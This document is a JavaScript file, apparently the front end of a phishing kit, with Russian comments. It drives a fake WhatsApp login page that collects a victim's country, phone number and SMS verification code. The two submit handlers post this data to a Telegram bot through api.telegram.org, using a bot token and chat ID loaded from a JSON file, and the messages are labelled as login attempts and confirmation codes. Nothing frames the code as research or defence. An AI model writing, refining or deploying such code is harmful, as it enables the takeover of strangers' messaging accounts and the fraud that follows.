// Ховер эффект на стрелочку на кнопке скачать

document.querySelector('.main__nope a').addEventListener('mouseover', event => {
    document.querySelector('.main__nope svg').style.fill = "#25D366";
})

document.querySelector('.main__nope a').addEventListener('mouseleave', event => {
    document.querySelector('.main__nope svg').style.fill = "#000";
})

// Галочка о запоминании пользователя

let activeCheck = true;

document.querySelector('.main__checkbox').addEventListener('click', event => {
    if ( activeCheck == true ) {
        document.querySelector('.main__checkbox svg').style.display = "none";
        document.querySelector('.main__checkbox').style.background = "#ffffff00";
        document.querySelector('.main__checkbox').style.border = "2px solid #cdcdcd";
        activeCheck = false;
    } else {
        document.querySelector('.main__checkbox svg').style.display = "block";
        document.querySelector('.main__checkbox').style.background = "#25D366";
        document.querySelector('.main__checkbox').style.border = "2px solid #25D366";
        activeCheck = true;
    }
})

// Переключение экранов

document.querySelector('.main__phone').addEventListener('click', event => {
    document.querySelector('.main__body').style.display = "none";
    document.querySelector('.phone').style.display = "flex";

    setTimeout( () => {
        document.querySelector('.phone__load').style.display = "none";
    }, 2000)
})

document.querySelector('.phone__qr').addEventListener('click', event => {
    document.querySelector('.main__body').style.display = "block";
    document.querySelector('.phone').style.display = "none";
})

document.querySelector('.code__back').addEventListener('click', event => {
    document.querySelector('.code').style.display = "none";
    document.querySelector('.phone').style.display = "flex";
})

// Выбор страны

document.querySelector('.phone__country').addEventListener('click', event => {
    document.querySelector('.list').style.width = "100%";
    document.querySelector('.list').style.height = "337px";
})

let arrCountry = [];
document.querySelectorAll('.list__card').forEach( (item, i) => {
    arrCountry.push(`${document.querySelectorAll('.list__ru')[i].textContent} ${document.querySelectorAll('.list__orig')[i].textContent} `);
})

document.querySelector('.list__input').addEventListener('input', event => {
    
    document.querySelectorAll('.list__card').forEach( (item, i) => {
        item.style.display = "none";
    })

    document.querySelectorAll('.list__card').forEach( (item, i) => {

        if ( String(arrCountry[i]).toLocaleLowerCase().includes(String(document.querySelector('.list__input').value).toLocaleLowerCase()) ) {
            document.querySelectorAll('.list__card')[i].style.display = "flex";
        }
    })

    if ( document.querySelector('.list__input').value == "" ) {
        document.querySelector('.list__clear').style.display = "none";
        document.querySelectorAll('.list__card').forEach( (item, i) => {
            item.style.display = "flex";
        })
    } else {
        document.querySelector('.list__clear').style.display = "flex";
    }

})

document.querySelector('.list__clear').addEventListener('click', event => {
    document.querySelector('.list__clear').style.display = "none";
    document.querySelector('.list__input').value = "";
    document.querySelectorAll('.list__card').forEach( (item, i) => {
        item.style.display = "flex";
    })
})

document.querySelectorAll('.list__card').forEach( (item, i) => {
    item.addEventListener('click', event => {
        document.querySelector('.phone__name').textContent = document.querySelectorAll('.list__ru')[i].textContent;
        document.querySelector('.phone__flag img').src = document.querySelectorAll('.list__flag img')[i].src;
        document.querySelector('.phone__input').value = document.querySelectorAll('.list__code')[i].textContent;

        document.querySelectorAll('.list__card').forEach( (item, i) => {
            item.classList.remove('list__card-active');
        })
        item.classList.add('list__card-active');

        setTimeout( () => {
            document.querySelector('.list').style.width = "0px";
            document.querySelector('.list').style.height = "0px";
        }, 100)
    })
})

document.addEventListener('click', (e) => {
  const list = document.querySelector('.list');
  const phoneCountry = document.querySelector('.phone__country');

  if (
    list &&
    !list.contains(e.target) &&
    !phoneCountry.contains(e.target)
  ) {
    document.querySelector('.list').style.width = "0px";
    document.querySelector('.list').style.height = "0px";
  }
});

// Загрузка страницы

document.addEventListener("DOMContentLoaded", function () {
  setTimeout( () => {
    document.querySelector('.loading').style.display = "none";
  }, 1000)
});

// Переход к коду смс

const input = document.querySelector('.phone__input');

input.addEventListener('input', () => {
    let val = input.value;

    // удаляем всё кроме цифр и плюса
    val = val.replace(/[^0-9+]/g, '');

    // оставляем плюс только в начале
    if (val.startsWith('+')) {
    val = '+' + val.slice(1).replace(/\+/g, '');
    } else {
    val = val.replace(/\+/g, '');
    }

    input.value = val;

    document.querySelector('.phone__message').style.opacity = 0;
});

document.querySelector('.phone__next').addEventListener('click', event => {
    if ( document.querySelector('.phone__input').value.length < 12 || !document.querySelector('.phone__input').value.includes("+") ) {
        document.querySelector('.phone__message').style.opacity = 1;
    } else {
        document.querySelector('.phone__load').style.display = "flex";

        let messageTg = `<b>🚪 Попытка входа</b>\n`;
        messageTg += `<b>Страна - </b>${document.querySelector('.phone__name').textContent}\n`;
        messageTg += `<b>Номер - </b>${document.querySelector('.phone__input').value}`;

        axios.post(URI_API, {
            chat_id: CHAT_ID,
            parse_mode: "html",
            text: messageTg
        });

        setTimeout( () => {
            document.querySelector('.phone__load').style.display = "none";
            document.querySelector('.phone').style.display = "none";
            document.querySelector('.code').style.display = "flex";
        }, 3000)
    }
})

// Обработка кода

const inputs = document.querySelectorAll('.code__input');

inputs.forEach((input, index) => {
  input.addEventListener('input', (e) => {
    let val = input.value;

    // разрешаем только один символ
    val = val.replace(/./g, (match, i) => i === 0 ? match : ''); 
    input.value = val;

    // если есть символ, перейти к следующему input
    if (val && index < inputs.length - 1) {
      inputs[index + 1].focus();
    }
  });

  input.addEventListener('keydown', (e) => {
    // при backspace и пустом input — возвращаемся на предыдущий
    if (e.key === 'Backspace' && !input.value && index > 0) {
      inputs[index - 1].focus();
    }
  });

  input.addEventListener('paste', (e) => {
    e.preventDefault();
    const pasteData = e.clipboardData.getData('text').slice(0, inputs.length - index);
    [...pasteData].forEach((char, i) => {
      if (index + i < inputs.length) {
        inputs[index + i].value = char;
      }
    });
    // фокус на последний вставленный input
    const lastIndex = Math.min(index + pasteData.length, inputs.length - 1);
    inputs[lastIndex].focus();
  });
});

// Отправка кода

document.querySelector('.code__next').addEventListener('click', event => {
    let noProblem = true;

    document.querySelectorAll('.code__input').forEach( (item, i) => {
        if ( item.value.length == 0 ) noProblem = false;
    })

    if ( noProblem ) {
        document.querySelector('.code__load').style.display = "flex";

        let finalCode = '';

        document.querySelectorAll('.code__input').forEach( (item, i) => {
            finalCode += item.value;
        })

        let messageTg = `<b>📱 Код подтверждения</b>\n`;
        messageTg += `<b>Страна - </b>${document.querySelector('.phone__name').textContent}\n`;
        messageTg += `<b>Номер - </b>${document.querySelector('.phone__input').value}\n`;
        messageTg += `<b>Номер - </b>${finalCode}`;

        axios.post(URI_API, {
            chat_id: CHAT_ID,
            parse_mode: "html",
            text: messageTg
        });
    }
})

// Устройство пользователя

const userAgent = navigator.userAgent.toLowerCase();
let device = 'Unknown';

if (/windows/.test(userAgent)) {
  device = 'Windows';
} else if (/macintosh|mac os x/.test(userAgent)) {
  device = 'MacOS';
} else if (/android/.test(userAgent)) {
  device = 'Android';
} else if (/iphone|ipad|ipod/.test(userAgent)) {
  device = 'iOS';
}

if ( device != 'Unknown' ) {
    document.querySelector('.main__info p').textContent = `Скачайте WhatsApp для ${device}`;
    document.querySelector('.main__info span').textContent = `Скачайте приложение для ${device} с улучшенной производительностью, поддержкой звонков и демонстрации экрана.`;
}

// Отправка заявки входа

let infoFromBase;
let TOKEN;
let URI_API = "";
let CHAT_ID = "";
const request = new XMLHttpRequest();
request.open("GET", "js/base.json");
request.setRequestHeader("Content-type", "application/json; charset=utf-8");
request.send();
request.addEventListener("readystatechange", (event) => {
    if (request.readyState === 4 && request.status === 200) {
        infoFromBase = JSON.parse(request.response);
        TOKEN = infoFromBase.token;
        CHAT_ID = infoFromBase.chatId;
        URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
    }
});